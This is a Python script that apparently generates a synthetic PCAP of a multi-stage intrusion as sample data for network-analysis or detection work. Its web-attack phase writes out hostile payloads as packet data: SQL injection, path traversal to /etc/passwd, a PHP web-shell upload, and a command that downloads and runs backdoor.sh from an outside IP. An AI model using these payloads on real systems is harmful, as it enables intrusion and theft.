"""
sample_data/create_sample_pcap.py - Generates an authentic binary PCAP capture file (.pcap)
simulating a realistic multi-stage enterprise cybersecurity incident:

1. Normal Enterprise Background Traffic (DNS & HTTP)
2. TCP SYN Reconnaissance / Port Scan (Attacker 192.168.1.105 scanning 192.168.1.50)
3. SSH Credential Brute-Forcing (Port 22 dictionary attacks)
4. Web Application Exploitation (SQL Injection & Directory Traversal on Port 80)
5. High-Entropy DNS Exfiltration & DGA queries
6. External Command & Control (C2) Beaconing to 203.0.113.88:4444
7. ICMP Covert Channel / Oversized Echo Requests
"""

import os
import random
from datetime import datetime, timezone
from scapy.all import (
    Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, wrpcap
)

def generate_incident_pcap(filepath: str) -> int:
    """Generate realistic cyber attack PCAP file and write to disk."""
    pkts = []
    base_time = datetime(2026, 10, 4, 10, 0, 0, tzinfo=timezone.utc).timestamp()
    cur_time = base_time

    # MAC & IP Entities
    mac_attacker = "00:1a:2b:3c:4d:5e"
    mac_victim   = "00:50:56:a1:b2:c3"
    mac_gw       = "00:0c:29:ab:cd:ef"
    mac_client   = "00:11:22:33:44:55"

    ip_attacker = "192.168.1.105"
    ip_victim   = "192.168.1.50"
    ip_gw       = "192.168.1.1"
    ip_client   = "192.168.1.12"
    ip_c2       = "203.0.113.88"

    # --- Phase 1: Normal Background Traffic (DNS & HTTP) ---
    domains = [
        ("corp-intranet.local", "192.168.1.200"),
        ("api.github.com", "140.82.121.6"),
        ("update.microsoft.com", "20.112.52.29"),
        ("time.nist.gov", "132.163.97.1"),
        ("cdn.cloudflare.net", "104.16.124.96")
    ]
    for i, (dom, resp_ip) in enumerate(domains):
        cur_time += random.uniform(0.5, 1.5)
        # DNS Query
        p_q = Ether(src=mac_client, dst=mac_gw)/IP(src=ip_client, dst=ip_gw)/UDP(sport=52000+i, dport=53)/DNS(rd=1, qd=DNSQR(qname=dom))
        p_q.time = cur_time
        pkts.append(p_q)

        # DNS Response
        cur_time += random.uniform(0.01, 0.04)
        p_r = Ether(src=mac_gw, dst=mac_client)/IP(src=ip_gw, dst=ip_client)/UDP(sport=53, dport=52000+i)/DNS(qr=1, an=DNSRR(rrname=dom, rdata=resp_ip))
        p_r.time = cur_time
        pkts.append(p_r)

    # Benign HTTP internal requests
    for i in range(8):
        cur_time += random.uniform(0.8, 2.0)
        sport = 53000 + i
        http_req = f"GET /portal/page_{i}.html HTTP/1.1\r\nHost: corp-intranet.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n"
        p_http = Ether(src=mac_client, dst=mac_gw)/IP(src=ip_client, dst="192.168.1.200")/TCP(sport=sport, dport=80, flags="PA", seq=100+i*200)/Raw(load=http_req.encode())
        p_http.time = cur_time
        pkts.append(p_http)

        cur_time += 0.03
        http_res = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 45\r\n\r\n<html><body>Corporate Portal Ready</body></html>"
        p_res = Ether(src=mac_gw, dst=mac_client)/IP(src="192.168.1.200", dst=ip_client)/TCP(sport=80, dport=sport, flags="PA", seq=500+i*200, ack=100+i*200+len(http_req))/Raw(load=http_res.encode())
        p_res.time = cur_time
        pkts.append(p_res)

    # --- Phase 2: TCP SYN Reconnaissance / Port Scan ---
    # Attacker 192.168.1.105 conducts SYN scan against server 192.168.1.50
    scan_ports = [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
        1433, 1521, 2049, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 8888, 9000, 9200, 27017
    ]
    for i, port in enumerate(scan_ports):
        cur_time += 0.08
        sport = 41000 + i
        # TCP SYN
        p_syn = Ether(src=mac_attacker, dst=mac_victim)/IP(src=ip_attacker, dst=ip_victim)/TCP(sport=sport, dport=port, flags="S", seq=2000+i)
        p_syn.time = cur_time
        pkts.append(p_syn)

        cur_time += 0.015
        if port in (22, 80, 443, 8080):
            # Open port: Server replies SYN-ACK
            p_sa = Ether(src=mac_victim, dst=mac_attacker)/IP(src=ip_victim, dst=ip_attacker)/TCP(sport=port, dport=sport, flags="SA", seq=7000+i, ack=2001+i)
            p_sa.time = cur_time
            pkts.append(p_sa)
            # Attacker sends RST to tear down (stealth scan)
            cur_time += 0.005
            p_rst = Ether(src=mac_attacker, dst=mac_victim)/IP(src=ip_attacker, dst=ip_victim)/TCP(sport=sport, dport=port, flags="R", seq=2001+i, ack=7001+i)
            p_rst.time = cur_time
            pkts.append(p_rst)
        else:
            # Closed port: Server replies RST-ACK
            p_rst = Ether(src=mac_victim, dst=mac_attacker)/IP(src=ip_victim, dst=ip_attacker)/TCP(sport=port, dport=sport, flags="RA", seq=0, ack=2001+i)
            p_rst.time = cur_time
            pkts.append(p_rst)

    # --- Phase 3: SSH Brute-Force Attacks (Port 22) ---
    # Attacker targets discovered open SSH port with rapid connection attempts
    for i in range(16):
        cur_time += random.uniform(0.3, 0.6)
        sport = 46000 + i
        # Handshake: SYN -> SYN-ACK -> ACK
        p1 = Ether(src=mac_attacker, dst=mac_victim)/IP(src=ip_attacker, dst=ip_victim)/TCP(sport=sport, dport=22, flags="S", seq=10000+i*500)
        p1.time = cur_time
        pkts.append(p1)

        cur_time += 0.01
        p2 = Ether(src=mac_victim, dst=mac_attacker)/IP(src=ip_victim, dst=ip_attacker)/TCP(sport=22, dport=sport, flags="SA", seq=20000+i*500, ack=10001+i*500)
        p2.time = cur_time
        pkts.append(p2)

        cur_time += 0.01
        p3 = Ether(src=mac_attacker, dst=mac_victim)/IP(src=ip_attacker, dst=ip_victim)/TCP(sport=sport, dport=22, flags="A", seq=10001+i*500, ack=20001+i*500)
        p3.time = cur_time
        pkts.append(p3)

        # SSH Version Exchange / Auth Attempt
        cur_time += 0.02
        banner = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\r\n"
        p4 = Ether(src=mac_attacker, dst=mac_victim)/IP(src=ip_attacker, dst=ip_victim)/TCP(sport=sport, dport=22, flags="PA", seq=10001+i*500, ack=20001+i*500)/Raw(load=banner)
        p4.time = cur_time
        pkts.append(p4)

        # Server responds and closes failed auth
        cur_time += 0.05
        p5 = Ether(src=mac_victim, dst=mac_attacker)/IP(src=ip_victim, dst=ip_attacker)/TCP(sport=22, dport=sport, flags="FA", seq=20001+i*500, ack=10001+i*500+len(banner))
        p5.time = cur_time
        pkts.append(p5)

    # --- Phase 4: Web Application Exploitation (HTTP Anomalies) ---
    web_attacks = [
        ("TRACE", "/admin/debug_console", "curl/8.1.2"),
        ("CONNECT", "internal-proxy.corp.local:8080", "Mozilla/5.0"),
        ("GET", "/login.php?user=admin%27%20OR%20%271%27=%271--&pass=x", "sqlmap/1.7.2#stable"),
        ("GET", "/rest/api/v1/users?search=%27%20UNION%20SELECT%20username,password,credit_card%20FROM%20users--", "Mozilla/5.0"),
        ("GET", "/index.php?page=../../../../../../etc/passwd", "curl/8.1.2"),
        ("GET", "/download.php?file=../../../../../../windows/win.ini", "Mozilla/5.0"),
        ("POST", "/upload.php?action=save_avatar", "python-requests/2.31.0"),
        ("GET", "/uploads/shell.php?cmd=id;uname+-a;cat+/etc/shadow", "Mozilla/5.0"),
        ("GET", "/api/v1/exec?cmd=wget+http://203.0.113.88/backdoor.sh+-O+/tmp/b.sh;sh+/tmp/b.sh", "curl/8.1.2"),
    ]
    for i, (method, uri, ua) in enumerate(web_attacks):
        cur_time += random.uniform(0.5, 1.2)
        sport = 56000 + i
        raw_payload = f"{method} {uri} HTTP/1.1\r\nHost: 192.168.1.50\r\nUser-Agent: {ua}\r\nAccept: */*\r\n\r\n"
        if method == "POST":
            raw_payload += "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n<?php system($_GET['cmd']); ?>\r\n"

        p_req = Ether(src=mac_attacker, dst=mac_victim)/IP(src=ip_attacker, dst=ip_victim)/TCP(sport=sport, dport=80, flags="PA", seq=30000+i*1000)/Raw(load=raw_payload.encode())
        p_req.time = cur_time
        pkts.append(p_req)

        cur_time += 0.03
        status_line = "HTTP/1.1 500 Internal Server Error\r\n" if "UNION" in uri else "HTTP/1.1 200 OK\r\n"
        resp_body = "uid=0(root) gid=0(root) groups=0(root)\n" if "cmd=id" in uri else "root:x:0:0:root:/root:/bin/bash\n"
        p_res = Ether(src=mac_victim, dst=mac_attacker)/IP(src=ip_victim, dst=ip_attacker)/TCP(sport=80, dport=sport, flags="PA", seq=40000+i*1000, ack=30000+i*1000+len(raw_payload))/Raw(load=f"{status_line}Server: Apache/2.4.52\r\nContent-Length: {len(resp_body)}\r\n\r\n{resp_body}".encode())
        p_res.time = cur_time
        pkts.append(p_res)

    # --- Phase 5: High-Entropy DNS Exfiltration & DGA Queries ---
    exfil_domains = [
        "v8x9a2k1m4n8p0q2w5z7b1c2d3e4f5g6h7j8k9l0m1n2p3.corp-exfil.xyz",
        "k9j8h7g6f5d4s3a2z1x0q9w8e7r6t5y4u3i2o1p0a9s8d7.corp-exfil.xyz",
        "m1n2b3v4c5x6z7l8k9j0h1g2f3d4s5a6q7w8e9r0t1y2u3.corp-exfil.xyz",
        "q7w6e5r4t3y2u1i0o9p8z1x2c3v4b5n6m7k8j9h0g1f2d3.corp-exfil.xyz",
        "a9b8c7d6e5f40123456789abcdef0123456789abcdef01.corp-exfil.xyz",
        "7x9y2z3a4b5c6d7e8f90112233445566778899aabbccdd.corp-exfil.xyz",
        "pw89sk23mj98fh23kj1200112233445566778899aabbcc.corp-exfil.xyz"
    ]
    for i, dname in enumerate(exfil_domains):
        cur_time += random.uniform(0.3, 0.6)
        p_dns = Ether(src=mac_attacker, dst=mac_gw)/IP(src=ip_attacker, dst=ip_gw)/UDP(sport=53800+i, dport=53)/DNS(rd=1, qd=DNSQR(qname=dname))
        p_dns.time = cur_time
        pkts.append(p_dns)

        cur_time += 0.02
        p_dns_r = Ether(src=mac_gw, dst=mac_attacker)/IP(src=ip_gw, dst=ip_attacker)/UDP(sport=53, dport=53800+i)/DNS(qr=1, an=DNSRR(rrname=dname, rdata="203.0.113.88"))
        p_dns_r.time = cur_time
        pkts.append(p_dns_r)

    # --- Phase 6: Outbound Command & Control (C2) Beaconing (Port 4444) ---
    # Periodic heartbeat beacon to external suspicious IP
    for i in range(12):
        cur_time += 2.0  # Periodic regular interval ~2s
        sport = 49200 + i
        # TCP SYN to C2
        p_c2_syn = Ether(src=mac_attacker, dst=mac_gw)/IP(src=ip_attacker, dst=ip_c2)/TCP(sport=sport, dport=4444, flags="S", seq=50000+i*200)
        p_c2_syn.time = cur_time
        pkts.append(p_c2_syn)

        cur_time += 0.02
        # C2 SYN-ACK
        p_c2_sa = Ether(src=mac_gw, dst=mac_attacker)/IP(src=ip_c2, dst=ip_attacker)/TCP(sport=4444, dport=sport, flags="SA", seq=60000+i*200, ack=50001+i*200)
        p_c2_sa.time = cur_time
        pkts.append(p_c2_sa)

        cur_time += 0.01
        # C2 Beacon Checkin Payload
        beacon_load = b"\xde\xad\xbe\xefAGENT_HEARTBEAT_105\x00\x00\x00"
        p_beacon = Ether(src=mac_attacker, dst=mac_gw)/IP(src=ip_attacker, dst=ip_c2)/TCP(sport=sport, dport=4444, flags="PA", seq=50001+i*200, ack=60001+i*200)/Raw(load=beacon_load)
        p_beacon.time = cur_time
        pkts.append(p_beacon)

        cur_time += 0.02
        # C2 Sleep Response
        c2_resp = b"\xde\xad\xbe\xefCOMMAND:SLEEP_INTERVAL_60s\x00"
        p_c2_resp = Ether(src=mac_gw, dst=mac_attacker)/IP(src=ip_c2, dst=ip_attacker)/TCP(sport=4444, dport=sport, flags="PA", seq=60001+i*200, ack=50001+i*200+len(beacon_load))/Raw(load=c2_resp)
        p_c2_resp.time = cur_time
        pkts.append(p_c2_resp)

    # --- Phase 7: ICMP Anomaly / Tunneling ---
    for i in range(6):
        cur_time += 0.7
        icmp_data = b"STOLEN_CREDENTIALS_DUMP_CHUNK_" + (b"X" * 180)
        p_icmp = Ether(src=mac_attacker, dst=mac_victim)/IP(src=ip_attacker, dst=ip_victim)/ICMP(type=8, code=0)/Raw(load=icmp_data)
        p_icmp.time = cur_time
        pkts.append(p_icmp)

    # Sort packets strictly by timestamp
    pkts.sort(key=lambda p: float(p.time))

    os.makedirs(os.path.dirname(filepath), exist_ok=True)
    wrpcap(filepath, pkts)
    return len(pkts)


if __name__ == "__main__":
    out1 = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "cyber_attack_incident.pcap"))
    out2 = os.path.abspath(os.path.join(os.path.dirname(__file__), "cyber_attack_incident.pcap"))
    
    count1 = generate_incident_pcap(out1)
    print(f"Generated {count1} packets in {out1}")
    
    count2 = generate_incident_pcap(out2)
    print(f"Generated {count2} packets in {out2}")
